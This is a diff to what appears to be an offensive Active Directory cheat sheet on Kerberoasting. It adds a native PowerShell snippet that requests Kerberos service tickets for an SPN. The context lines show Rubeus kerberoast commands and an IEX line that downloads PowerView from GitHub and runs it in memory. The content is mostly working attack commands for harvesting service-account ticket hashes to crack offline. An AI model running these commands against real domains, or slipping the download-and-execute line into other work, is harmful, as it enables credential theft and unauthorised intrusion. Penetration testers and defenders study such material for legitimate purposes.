@@ -31,6 +31,11 @@ Against single user using Rubeus.exe:
 `.\Rubeus.exe kerberoast /user:svc_mssql /nowrap`   
 `.\Rubeus.exe kerberoast /spn:"SPN" /nowrap /domain:windomain.local /dc:10.0.2.3`   
 
+Using native PowerShell:
+```powershell
+Add-Type -AssemblyName System.IdentityModel  
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/websrv.domain.local"  
+```
 Using Powerview:   
 ``` 
 IEX ((New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"))
